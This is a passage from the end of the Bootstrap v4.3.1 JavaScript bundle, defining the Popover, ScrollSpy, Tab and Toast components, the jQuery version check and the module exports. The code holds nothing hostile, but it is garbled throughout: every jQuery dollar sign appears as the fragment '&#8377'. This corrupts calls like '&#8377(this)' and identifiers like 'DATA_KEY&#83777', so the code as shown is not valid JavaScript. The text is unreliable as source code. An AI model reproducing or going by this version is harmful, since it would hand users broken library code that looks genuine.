        return _Tooltip.apply(this, arguments) || this;
      }

      var _proto = Popover.prototype;

      // Overrides
      _proto.isWithContent = function isWithContent() {
        return this.getTitle() || this._getContent();
      };

      _proto.addAttachmentClass = function addAttachmentClass(attachment) {
        &#8377(this.getTipElement()).addClass(CLASS_PREFIX&#83771 + "-" + attachment);
      };

      _proto.getTipElement = function getTipElement() {
        this.tip = this.tip || &#8377(this.config.template)[0];
        return this.tip;
      };

      _proto.setContent = function setContent() {
        var &#8377tip = &#8377(this.getTipElement()); // We use append for html objects to maintain js events

        this.setElementContent(&#8377tip.find(Selector&#83777.TITLE), this.getTitle());

        var content = this._getContent();

        if (typeof content === 'function') {
          content = content.call(this.element);
        }

        this.setElementContent(&#8377tip.find(Selector&#83777.CONTENT), content);
        &#8377tip.removeClass(ClassName&#83777.FADE + " " + ClassName&#83777.SHOW);
      } // Private
      ;

      _proto._getContent = function _getContent() {
        return this.element.getAttribute('data-content') || this.config.content;
      };

      _proto._cleanTipClass = function _cleanTipClass() {
        var &#8377tip = &#8377(this.getTipElement());
        var tabClass = &#8377tip.attr('class').match(BSCLS_PREFIX_REGEX&#83771);

        if (tabClass !== null && tabClass.length > 0) {
          &#8377tip.removeClass(tabClass.join(''));
        }
      } // Static
      ;

      Popover._jQueryInterface = function _jQueryInterface(config) {
        return this.each(function () {
          var data = &#8377(this).data(DATA_KEY&#83777);

          var _config = typeof config === 'object' ? config : null;

          if (!data && /dispose|hide/.test(config)) {
            return;
          }

          if (!data) {
            data = new Popover(this, _config);
            &#8377(this).data(DATA_KEY&#83777, data);
          }

          if (typeof config === 'string') {
            if (typeof data[config] === 'undefined') {
              throw new TypeError("No method named \"" + config + "\"");
            }

            data[config]();
          }
        });
      };

      _createClass(Popover, null, [{
        key: "VERSION",
        // Getters
        get: function get() {
          return VERSION&#83777;
        }
      }, {
        key: "Default",
        get: function get() {
          return Default&#83775;
        }
      }, {
        key: "NAME",
        get: function get() {
          return NAME&#83777;
        }
      }, {
        key: "DATA_KEY",
        get: function get() {
          return DATA_KEY&#83777;
        }
      }, {
        key: "Event",
        get: function get() {
          return Event&#83777;
        }
      }, {
        key: "EVENT_KEY",
        get: function get() {
          return EVENT_KEY&#83777;
        }
      }, {
        key: "DefaultType",
        get: function get() {
          return DefaultType&#83775;
        }
      }]);

      return Popover;
    }(Tooltip);
  /**
   * ------------------------------------------------------------------------
   * jQuery
   * ------------------------------------------------------------------------
   */


  &#8377.fn[NAME&#83777] = Popover._jQueryInterface;
  &#8377.fn[NAME&#83777].Constructor = Popover;

  &#8377.fn[NAME&#83777].noConflict = function () {
    &#8377.fn[NAME&#83777] = JQUERY_NO_CONFLICT&#83777;
    return Popover._jQueryInterface;
  };

  /**
   * ------------------------------------------------------------------------
   * Constants
   * ------------------------------------------------------------------------
   */

  var NAME&#83778 = 'scrollspy';
  var VERSION&#83778 = '4.3.1';
  var DATA_KEY&#83778 = 'bs.scrollspy';
  var EVENT_KEY&#83778 = "." + DATA_KEY&#83778;
  var DATA_API_KEY&#83776 = '.data-api';
  var JQUERY_NO_CONFLICT&#83778 = &#8377.fn[NAME&#83778];
  var Default&#83776 = {
    offset: 10,
    method: 'auto',
    target: ''
  };
  var DefaultType&#83776 = {
    offset: 'number',
    method: 'string',
    target: '(string|element)'
  };
  var Event&#83778 = {
    ACTIVATE: "activate" + EVENT_KEY&#83778,
    SCROLL: "scroll" + EVENT_KEY&#83778,
    LOAD_DATA_API: "load" + EVENT_KEY&#83778 + DATA_API_KEY&#83776
  };
  var ClassName&#83778 = {
    DROPDOWN_ITEM: 'dropdown-item',
    DROPDOWN_MENU: 'dropdown-menu',
    ACTIVE: 'active'
  };
  var Selector&#83778 = {
    DATA_SPY: '[data-spy="scroll"]',
    ACTIVE: '.active',
    NAV_LIST_GROUP: '.nav, .list-group',
    NAV_LINKS: '.nav-link',
    NAV_ITEMS: '.nav-item',
    LIST_ITEMS: '.list-group-item',
    DROPDOWN: '.dropdown',
    DROPDOWN_ITEMS: '.dropdown-item',
    DROPDOWN_TOGGLE: '.dropdown-toggle'
  };
  var OffsetMethod = {
    OFFSET: 'offset',
    POSITION: 'position'
    /**
     * ------------------------------------------------------------------------
     * Class Definition
     * ------------------------------------------------------------------------
     */

  };

  var ScrollSpy =
    /*#__PURE__*/
    function () {
      function ScrollSpy(element, config) {
        var _this = this;

        this._element = element;
        this._scrollElement = element.tagName === 'BODY' ? window : element;
        this._config = this._getConfig(config);
        this._selector = this._config.target + " " + Selector&#83778.NAV_LINKS + "," + (this._config.target + " " + Selector&#83778.LIST_ITEMS + ",") + (this._config.target + " " + Selector&#83778.DROPDOWN_ITEMS);
        this._offsets = [];
        this._targets = [];
        this._activeTarget = null;
        this._scrollHeight = 0;
        &#8377(this._scrollElement).on(Event&#83778.SCROLL, function (event) {
          return _this._process(event);
        });
        this.refresh();

        this._process();
      } // Getters


      var _proto = ScrollSpy.prototype;

      // Public
      _proto.refresh = function refresh() {
        var _this2 = this;

        var autoMethod = this._scrollElement === this._scrollElement.window ? OffsetMethod.OFFSET : OffsetMethod.POSITION;
        var offsetMethod = this._config.method === 'auto' ? autoMethod : this._config.method;
        var offsetBase = offsetMethod === OffsetMethod.POSITION ? this._getScrollTop() : 0;
        this._offsets = [];
        this._targets = [];
        this._scrollHeight = this._getScrollHeight();
        var targets = [].slice.call(document.querySelectorAll(this._selector));
        targets.map(function (element) {
          var target;
          var targetSelector = Util.getSelectorFromElement(element);

          if (targetSelector) {
            target = document.querySelector(targetSelector);
          }

          if (target) {
            var targetBCR = target.getBoundingClientRect();

            if (targetBCR.width || targetBCR.height) {
              // TODO (fat): remove sketch reliance on jQuery position/offset
              return [&#8377(target)[offsetMethod]().top + offsetBase, targetSelector];
            }
          }

          return null;
        }).filter(function (item) {
          return item;
        }).sort(function (a, b) {
          return a[0] - b[0];
        }).forEach(function (item) {
          _this2._offsets.push(item[0]);

          _this2._targets.push(item[1]);
        });
      };

      _proto.dispose = function dispose() {
        &#8377.removeData(this._element, DATA_KEY&#83778);
        &#8377(this._scrollElement).off(EVENT_KEY&#83778);
        this._element = null;
        this._scrollElement = null;
        this._config = null;
        this._selector = null;
        this._offsets = null;
        this._targets = null;
        this._activeTarget = null;
        this._scrollHeight = null;
      } // Private
      ;

      _proto._getConfig = function _getConfig(config) {
        config = _objectSpread({}, Default&#83776, typeof config === 'object' && config ? config : {});

        if (typeof config.target !== 'string') {
          var id = &#8377(config.target).attr('id');

          if (!id) {
            id = Util.getUID(NAME&#83778);
            &#8377(config.target).attr('id', id);
          }

          config.target = "#" + id;
        }

        Util.typeCheckConfig(NAME&#83778, config, DefaultType&#83776);
        return config;
      };

      _proto._getScrollTop = function _getScrollTop() {
        return this._scrollElement === window ? this._scrollElement.pageYOffset : this._scrollElement.scrollTop;
      };

      _proto._getScrollHeight = function _getScrollHeight() {
        return this._scrollElement.scrollHeight || Math.max(document.body.scrollHeight, document.documentElement.scrollHeight);
      };

      _proto._getOffsetHeight = function _getOffsetHeight() {
        return this._scrollElement === window ? window.innerHeight : this._scrollElement.getBoundingClientRect().height;
      };

      _proto._process = function _process() {
        var scrollTop = this._getScrollTop() + this._config.offset;

        var scrollHeight = this._getScrollHeight();

        var maxScroll = this._config.offset + scrollHeight - this._getOffsetHeight();

        if (this._scrollHeight !== scrollHeight) {
          this.refresh();
        }

        if (scrollTop >= maxScroll) {
          var target = this._targets[this._targets.length - 1];

          if (this._activeTarget !== target) {
            this._activate(target);
          }

          return;
        }

        if (this._activeTarget && scrollTop < this._offsets[0] && this._offsets[0] > 0) {
          this._activeTarget = null;

          this._clear();

          return;
        }

        var offsetLength = this._offsets.length;

        for (var i = offsetLength; i--;) {
          var isActiveTarget = this._activeTarget !== this._targets[i] && scrollTop >= this._offsets[i] && (typeof this._offsets[i + 1] === 'undefined' || scrollTop < this._offsets[i + 1]);

          if (isActiveTarget) {
            this._activate(this._targets[i]);
          }
        }
      };

      _proto._activate = function _activate(target) {
        this._activeTarget = target;

        this._clear();

        var queries = this._selector.split(',').map(function (selector) {
          return selector + "[data-target=\"" + target + "\"]," + selector + "[href=\"" + target + "\"]";
        });

        var &#8377link = &#8377([].slice.call(document.querySelectorAll(queries.join(','))));

        if (&#8377link.hasClass(ClassName&#83778.DROPDOWN_ITEM)) {
          &#8377link.closest(Selector&#83778.DROPDOWN).find(Selector&#83778.DROPDOWN_TOGGLE).addClass(ClassName&#83778.ACTIVE);
          &#8377link.addClass(ClassName&#83778.ACTIVE);
        } else {
          // Set triggered link as active
          &#8377link.addClass(ClassName&#83778.ACTIVE); // Set triggered links parents as active
          // With both <ul> and <nav> markup a parent is the previous sibling of any nav ancestor

          &#8377link.parents(Selector&#83778.NAV_LIST_GROUP).prev(Selector&#83778.NAV_LINKS + ", " + Selector&#83778.LIST_ITEMS).addClass(ClassName&#83778.ACTIVE); // Handle special case when .nav-link is inside .nav-item

          &#8377link.parents(Selector&#83778.NAV_LIST_GROUP).prev(Selector&#83778.NAV_ITEMS).children(Selector&#83778.NAV_LINKS).addClass(ClassName&#83778.ACTIVE);
        }

        &#8377(this._scrollElement).trigger(Event&#83778.ACTIVATE, {
          relatedTarget: target
        });
      };

      _proto._clear = function _clear() {
        [].slice.call(document.querySelectorAll(this._selector)).filter(function (node) {
          return node.classList.contains(ClassName&#83778.ACTIVE);
        }).forEach(function (node) {
          return node.classList.remove(ClassName&#83778.ACTIVE);
        });
      } // Static
      ;

      ScrollSpy._jQueryInterface = function _jQueryInterface(config) {
        return this.each(function () {
          var data = &#8377(this).data(DATA_KEY&#83778);

          var _config = typeof config === 'object' && config;

          if (!data) {
            data = new ScrollSpy(this, _config);
            &#8377(this).data(DATA_KEY&#83778, data);
          }

          if (typeof config === 'string') {
            if (typeof data[config] === 'undefined') {
              throw new TypeError("No method named \"" + config + "\"");
            }

            data[config]();
          }
        });
      };

      _createClass(ScrollSpy, null, [{
        key: "VERSION",
        get: function get() {
          return VERSION&#83778;
        }
      }, {
        key: "Default",
        get: function get() {
          return Default&#83776;
        }
      }]);

      return ScrollSpy;
    }();
  /**
   * ------------------------------------------------------------------------
   * Data Api implementation
   * ------------------------------------------------------------------------
   */


  &#8377(window).on(Event&#83778.LOAD_DATA_API, function () {
    var scrollSpys = [].slice.call(document.querySelectorAll(Selector&#83778.DATA_SPY));
    var scrollSpysLength = scrollSpys.length;

    for (var i = scrollSpysLength; i--;) {
      var &#8377spy = &#8377(scrollSpys[i]);

      ScrollSpy._jQueryInterface.call(&#8377spy, &#8377spy.data());
    }
  });
  /**
   * ------------------------------------------------------------------------
   * jQuery
   * ------------------------------------------------------------------------
   */

  &#8377.fn[NAME&#83778] = ScrollSpy._jQueryInterface;
  &#8377.fn[NAME&#83778].Constructor = ScrollSpy;

  &#8377.fn[NAME&#83778].noConflict = function () {
    &#8377.fn[NAME&#83778] = JQUERY_NO_CONFLICT&#83778;
    return ScrollSpy._jQueryInterface;
  };

  /**
   * ------------------------------------------------------------------------
   * Constants
   * ------------------------------------------------------------------------
   */

  var NAME&#83779 = 'tab';
  var VERSION&#83779 = '4.3.1';
  var DATA_KEY&#83779 = 'bs.tab';
  var EVENT_KEY&#83779 = "." + DATA_KEY&#83779;
  var DATA_API_KEY&#83777 = '.data-api';
  var JQUERY_NO_CONFLICT&#83779 = &#8377.fn[NAME&#83779];
  var Event&#83779 = {
    HIDE: "hide" + EVENT_KEY&#83779,
    HIDDEN: "hidden" + EVENT_KEY&#83779,
    SHOW: "show" + EVENT_KEY&#83779,
    SHOWN: "shown" + EVENT_KEY&#83779,
    CLICK_DATA_API: "click" + EVENT_KEY&#83779 + DATA_API_KEY&#83777
  };
  var ClassName&#83779 = {
    DROPDOWN_MENU: 'dropdown-menu',
    ACTIVE: 'active',
    DISABLED: 'disabled',
    FADE: 'fade',
    SHOW: 'show'
  };
  var Selector&#83779 = {
    DROPDOWN: '.dropdown',
    NAV_LIST_GROUP: '.nav, .list-group',
    ACTIVE: '.active',
    ACTIVE_UL: '> li > .active',
    DATA_TOGGLE: '[data-toggle="tab"], [data-toggle="pill"], [data-toggle="list"]',
    DROPDOWN_TOGGLE: '.dropdown-toggle',
    DROPDOWN_ACTIVE_CHILD: '> .dropdown-menu .active'
    /**
     * ------------------------------------------------------------------------
     * Class Definition
     * ------------------------------------------------------------------------
     */

  };

  var Tab =
    /*#__PURE__*/
    function () {
      function Tab(element) {
        this._element = element;
      } // Getters


      var _proto = Tab.prototype;

      // Public
      _proto.show = function show() {
        var _this = this;

        if (this._element.parentNode && this._element.parentNode.nodeType === Node.ELEMENT_NODE && &#8377(this._element).hasClass(ClassName&#83779.ACTIVE) || &#8377(this._element).hasClass(ClassName&#83779.DISABLED)) {
          return;
        }

        var target;
        var previous;
        var listElement = &#8377(this._element).closest(Selector&#83779.NAV_LIST_GROUP)[0];
        var selector = Util.getSelectorFromElement(this._element);

        if (listElement) {
          var itemSelector = listElement.nodeName === 'UL' || listElement.nodeName === 'OL' ? Selector&#83779.ACTIVE_UL : Selector&#83779.ACTIVE;
          previous = &#8377.makeArray(&#8377(listElement).find(itemSelector));
          previous = previous[previous.length - 1];
        }

        var hideEvent = &#8377.Event(Event&#83779.HIDE, {
          relatedTarget: this._element
        });
        var showEvent = &#8377.Event(Event&#83779.SHOW, {
          relatedTarget: previous
        });

        if (previous) {
          &#8377(previous).trigger(hideEvent);
        }

        &#8377(this._element).trigger(showEvent);

        if (showEvent.isDefaultPrevented() || hideEvent.isDefaultPrevented()) {
          return;
        }

        if (selector) {
          target = document.querySelector(selector);
        }

        this._activate(this._element, listElement);

        var complete = function complete() {
          var hiddenEvent = &#8377.Event(Event&#83779.HIDDEN, {
            relatedTarget: _this._element
          });
          var shownEvent = &#8377.Event(Event&#83779.SHOWN, {
            relatedTarget: previous
          });
          &#8377(previous).trigger(hiddenEvent);
          &#8377(_this._element).trigger(shownEvent);
        };

        if (target) {
          this._activate(target, target.parentNode, complete);
        } else {
          complete();
        }
      };

      _proto.dispose = function dispose() {
        &#8377.removeData(this._element, DATA_KEY&#83779);
        this._element = null;
      } // Private
      ;

      _proto._activate = function _activate(element, container, callback) {
        var _this2 = this;

        var activeElements = container && (container.nodeName === 'UL' || container.nodeName === 'OL') ? &#8377(container).find(Selector&#83779.ACTIVE_UL) : &#8377(container).children(Selector&#83779.ACTIVE);
        var active = activeElements[0];
        var isTransitioning = callback && active && &#8377(active).hasClass(ClassName&#83779.FADE);

        var complete = function complete() {
          return _this2._transitionComplete(element, active, callback);
        };

        if (active && isTransitioning) {
          var transitionDuration = Util.getTransitionDurationFromElement(active);
          &#8377(active).removeClass(ClassName&#83779.SHOW).one(Util.TRANSITION_END, complete).emulateTransitionEnd(transitionDuration);
        } else {
          complete();
        }
      };

      _proto._transitionComplete = function _transitionComplete(element, active, callback) {
        if (active) {
          &#8377(active).removeClass(ClassName&#83779.ACTIVE);
          var dropdownChild = &#8377(active.parentNode).find(Selector&#83779.DROPDOWN_ACTIVE_CHILD)[0];

          if (dropdownChild) {
            &#8377(dropdownChild).removeClass(ClassName&#83779.ACTIVE);
          }

          if (active.getAttribute('role') === 'tab') {
            active.setAttribute('aria-selected', false);
          }
        }

        &#8377(element).addClass(ClassName&#83779.ACTIVE);

        if (element.getAttribute('role') === 'tab') {
          element.setAttribute('aria-selected', true);
        }

        Util.reflow(element);

        if (element.classList.contains(ClassName&#83779.FADE)) {
          element.classList.add(ClassName&#83779.SHOW);
        }

        if (element.parentNode && &#8377(element.parentNode).hasClass(ClassName&#83779.DROPDOWN_MENU)) {
          var dropdownElement = &#8377(element).closest(Selector&#83779.DROPDOWN)[0];

          if (dropdownElement) {
            var dropdownToggleList = [].slice.call(dropdownElement.querySelectorAll(Selector&#83779.DROPDOWN_TOGGLE));
            &#8377(dropdownToggleList).addClass(ClassName&#83779.ACTIVE);
          }

          element.setAttribute('aria-expanded', true);
        }

        if (callback) {
          callback();
        }
      } // Static
      ;

      Tab._jQueryInterface = function _jQueryInterface(config) {
        return this.each(function () {
          var &#8377this = &#8377(this);
          var data = &#8377this.data(DATA_KEY&#83779);

          if (!data) {
            data = new Tab(this);
            &#8377this.data(DATA_KEY&#83779, data);
          }

          if (typeof config === 'string') {
            if (typeof data[config] === 'undefined') {
              throw new TypeError("No method named \"" + config + "\"");
            }

            data[config]();
          }
        });
      };

      _createClass(Tab, null, [{
        key: "VERSION",
        get: function get() {
          return VERSION&#83779;
        }
      }]);

      return Tab;
    }();
  /**
   * ------------------------------------------------------------------------
   * Data Api implementation
   * ------------------------------------------------------------------------
   */


  &#8377(document).on(Event&#83779.CLICK_DATA_API, Selector&#83779.DATA_TOGGLE, function (event) {
    event.preventDefault();

    Tab._jQueryInterface.call(&#8377(this), 'show');
  });
  /**
   * ------------------------------------------------------------------------
   * jQuery
   * ------------------------------------------------------------------------
   */

  &#8377.fn[NAME&#83779] = Tab._jQueryInterface;
  &#8377.fn[NAME&#83779].Constructor = Tab;

  &#8377.fn[NAME&#83779].noConflict = function () {
    &#8377.fn[NAME&#83779] = JQUERY_NO_CONFLICT&#83779;
    return Tab._jQueryInterface;
  };

  /**
   * ------------------------------------------------------------------------
   * Constants
   * ------------------------------------------------------------------------
   */

  var NAME&#8377a = 'toast';
  var VERSION&#8377a = '4.3.1';
  var DATA_KEY&#8377a = 'bs.toast';
  var EVENT_KEY&#8377a = "." + DATA_KEY&#8377a;
  var JQUERY_NO_CONFLICT&#8377a = &#8377.fn[NAME&#8377a];
  var Event&#8377a = {
    CLICK_DISMISS: "click.dismiss" + EVENT_KEY&#8377a,
    HIDE: "hide" + EVENT_KEY&#8377a,
    HIDDEN: "hidden" + EVENT_KEY&#8377a,
    SHOW: "show" + EVENT_KEY&#8377a,
    SHOWN: "shown" + EVENT_KEY&#8377a
  };
  var ClassName&#8377a = {
    FADE: 'fade',
    HIDE: 'hide',
    SHOW: 'show',
    SHOWING: 'showing'
  };
  var DefaultType&#83777 = {
    animation: 'boolean',
    autohide: 'boolean',
    delay: 'number'
  };
  var Default&#83777 = {
    animation: true,
    autohide: true,
    delay: 500
  };
  var Selector&#8377a = {
    DATA_DISMISS: '[data-dismiss="toast"]'
    /**
     * ------------------------------------------------------------------------
     * Class Definition
     * ------------------------------------------------------------------------
     */

  };

  var Toast =
    /*#__PURE__*/
    function () {
      function Toast(element, config) {
        this._element = element;
        this._config = this._getConfig(config);
        this._timeout = null;

        this._setListeners();
      } // Getters


      var _proto = Toast.prototype;

      // Public
      _proto.show = function show() {
        var _this = this;

        &#8377(this._element).trigger(Event&#8377a.SHOW);

        if (this._config.animation) {
          this._element.classList.add(ClassName&#8377a.FADE);
        }

        var complete = function complete() {
          _this._element.classList.remove(ClassName&#8377a.SHOWING);

          _this._element.classList.add(ClassName&#8377a.SHOW);

          &#8377(_this._element).trigger(Event&#8377a.SHOWN);

          if (_this._config.autohide) {
            _this.hide();
          }
        };

        this._element.classList.remove(ClassName&#8377a.HIDE);

        this._element.classList.add(ClassName&#8377a.SHOWING);

        if (this._config.animation) {
          var transitionDuration = Util.getTransitionDurationFromElement(this._element);
          &#8377(this._element).one(Util.TRANSITION_END, complete).emulateTransitionEnd(transitionDuration);
        } else {
          complete();
        }
      };

      _proto.hide = function hide(withoutTimeout) {
        var _this2 = this;

        if (!this._element.classList.contains(ClassName&#8377a.SHOW)) {
          return;
        }

        &#8377(this._element).trigger(Event&#8377a.HIDE);

        if (withoutTimeout) {
          this._close();
        } else {
          this._timeout = setTimeout(function () {
            _this2._close();
          }, this._config.delay);
        }
      };

      _proto.dispose = function dispose() {
        clearTimeout(this._timeout);
        this._timeout = null;

        if (this._element.classList.contains(ClassName&#8377a.SHOW)) {
          this._element.classList.remove(ClassName&#8377a.SHOW);
        }

        &#8377(this._element).off(Event&#8377a.CLICK_DISMISS);
        &#8377.removeData(this._element, DATA_KEY&#8377a);
        this._element = null;
        this._config = null;
      } // Private
      ;

      _proto._getConfig = function _getConfig(config) {
        config = _objectSpread({}, Default&#83777, &#8377(this._element).data(), typeof config === 'object' && config ? config : {});
        Util.typeCheckConfig(NAME&#8377a, config, this.constructor.DefaultType);
        return config;
      };

      _proto._setListeners = function _setListeners() {
        var _this3 = this;

        &#8377(this._element).on(Event&#8377a.CLICK_DISMISS, Selector&#8377a.DATA_DISMISS, function () {
          return _this3.hide(true);
        });
      };

      _proto._close = function _close() {
        var _this4 = this;

        var complete = function complete() {
          _this4._element.classList.add(ClassName&#8377a.HIDE);

          &#8377(_this4._element).trigger(Event&#8377a.HIDDEN);
        };

        this._element.classList.remove(ClassName&#8377a.SHOW);

        if (this._config.animation) {
          var transitionDuration = Util.getTransitionDurationFromElement(this._element);
          &#8377(this._element).one(Util.TRANSITION_END, complete).emulateTransitionEnd(transitionDuration);
        } else {
          complete();
        }
      } // Static
      ;

      Toast._jQueryInterface = function _jQueryInterface(config) {
        return this.each(function () {
          var &#8377element = &#8377(this);
          var data = &#8377element.data(DATA_KEY&#8377a);

          var _config = typeof config === 'object' && config;

          if (!data) {
            data = new Toast(this, _config);
            &#8377element.data(DATA_KEY&#8377a, data);
          }

          if (typeof config === 'string') {
            if (typeof data[config] === 'undefined') {
              throw new TypeError("No method named \"" + config + "\"");
            }

            data[config](this);
          }
        });
      };

      _createClass(Toast, null, [{
        key: "VERSION",
        get: function get() {
          return VERSION&#8377a;
        }
      }, {
        key: "DefaultType",
        get: function get() {
          return DefaultType&#83777;
        }
      }, {
        key: "Default",
        get: function get() {
          return Default&#83777;
        }
      }]);

      return Toast;
    }();
  /**
   * ------------------------------------------------------------------------
   * jQuery
   * ------------------------------------------------------------------------
   */


  &#8377.fn[NAME&#8377a] = Toast._jQueryInterface;
  &#8377.fn[NAME&#8377a].Constructor = Toast;

  &#8377.fn[NAME&#8377a].noConflict = function () {
    &#8377.fn[NAME&#8377a] = JQUERY_NO_CONFLICT&#8377a;
    return Toast._jQueryInterface;
  };

  /**
   * --------------------------------------------------------------------------
   * Bootstrap (v4.3.1): index.js
   * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)
   * --------------------------------------------------------------------------
   */

  (function () {
    if (typeof &#8377 === 'undefined') {
      throw new TypeError('Bootstrap\'s JavaScript requires jQuery. jQuery must be included before Bootstrap\'s JavaScript.');
    }

    var version = &#8377.fn.jquery.split(' ')[0].split('.');
    var minMajor = 1;
    var ltMajor = 2;
    var minMinor = 9;
    var minPatch = 1;
    var maxMajor = 4;

    if (version[0] < ltMajor && version[1] < minMinor || version[0] === minMajor && version[1] === minMinor && version[2] < minPatch || version[0] >= maxMajor) {
      throw new Error('Bootstrap\'s JavaScript requires at least jQuery v1.9.1 but less than v4.0.0');
    }
  })();

  exports.Util = Util;
  exports.Alert = Alert;
  exports.Button = Button;
  exports.Carousel = Carousel;
  exports.Collapse = Collapse;
  exports.Dropdown = Dropdown;
  exports.Modal = Modal;
  exports.Popover = Popover;
  exports.Scrollspy = ScrollSpy;
  exports.Tab = Tab;
  exports.Toast = Toast;
  exports.Tooltip = Tooltip;

  Object.defineProperty(exports, '__esModule', {
    value: true
  });

}));
//# sourceMappingURL=bootstrap.js.map